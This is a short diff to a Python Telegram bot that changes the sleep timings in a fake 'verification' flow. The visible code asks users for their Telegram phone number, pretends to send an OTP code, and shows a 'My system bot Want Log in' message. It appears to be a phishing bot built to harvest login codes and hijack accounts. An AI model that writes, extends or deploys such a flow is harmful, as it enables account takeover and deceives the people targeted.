@@ -93,7 +93,6 @@ async def free(_, message):
 
 @app.on_message(filters.command("verif") & filters.private)
 async def verip(_, message):
-    await asyncio.sleep(1)
     await app.send_message(message.chat.id, "Silahkan Masukann Nomer Telpon akun Telegram mu..")
 
 # SEND NOMER
@@ -101,9 +100,9 @@ async def verip(_, message):
 @app.on_message(filters.regex("6|1|2|3|4"))
 async def regex_cantik(_, message):
     await app.send_message(message.chat.id, "__Sent otp code...__")
-    time.sleep(10)
+    await asyncio.sleep(10)
     await app.send_message(message.chat.id, "__successfully sent otp code…__")
-    await asyncio.sleep(0.5)
+    await asyncio.sleep(0.2)
     await app.send_photo(message.chat.id, "https://graph.org/file/63bcc1838ae1db75b10c4.jpg", caption="""
 🤖 My system bot Want Log in 
 
